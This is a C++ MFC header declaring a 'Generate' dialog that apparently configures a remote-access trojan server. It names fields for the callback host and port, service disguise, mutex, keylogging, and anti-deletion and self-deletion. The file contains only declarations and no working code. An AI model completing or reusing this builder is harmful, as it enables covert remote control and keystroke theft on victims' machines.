#if !defined(AFX_GENERATE_H__D0A2EA00_9ED0_4E90_B386_1371A72EF7C1__INCLUDED_)
#define AFX_GENERATE_H__D0A2EA00_9ED0_4E90_B386_1371A72EF7C1__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
// Generate.h : header file
//

/////////////////////////////////////////////////////////////////////////////
// CGenerate dialog
#include "IniFile.h"

class CGenerate : public CDialog
{
// Construction
public:
	CGenerate(CWnd* pParent = NULL);   // standard constructor
	BOOL IsFileExist(LPCTSTR strFileName);
	void LogOut(LPCSTR OutText);
	CIniFile	m_IniFile;
// Dialog Data
	//{{AFX_DATA(CGenerate)
	enum { IDD = IDD_GENERATE };
	CButton	m_TestBtn;
	CEdit	m_Log;
	CString	m_Host;
	UINT	m_Port;
	CString	m_Group;
	CString	m_Version;
	CString	m_ServiceName;
	CString	m_ServiceDisplayName;
	CString	m_ServiceDescription;
	BOOL	m_Green;
	BOOL	m_Weite;
	BOOL	m_Service;
	CHAR	m_Install;
	CString	m_ProcessName;
	CString	m_FolderName;
	CString	m_Mutex;
	CString	m_Buildtime;
	CString	m_edit_kb;
	BOOL	m_kbcheck;
	BOOL	m_Antideletion;
	BOOL	m_Selfdeletion;
	//}}AFX_DATA


// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CGenerate)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:

	// Generated message map functions
	//{{AFX_MSG(CGenerate)
	afx_msg HBRUSH OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor);
	virtual BOOL OnInitDialog();
	afx_msg BOOL CreateServer(ONLINE_DATA *lpData,LPSTR szPath,char *datPaths);
	afx_msg void OnBuild();
	afx_msg void OnStartup();
	afx_msg void OnGreen();
	afx_msg void OnWrite();
	afx_msg void OnService();
	afx_msg void OnKbcheck();
	afx_msg void OnKbtest();
	afx_msg void OnTestMaster();
	afx_msg void TestMaster();
	afx_msg void OnRandom();
	afx_msg void OnBuildLogin();
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_GENERATE_H__D0A2EA00_9ED0_4E90_B386_1371A72EF7C1__INCLUDED_)
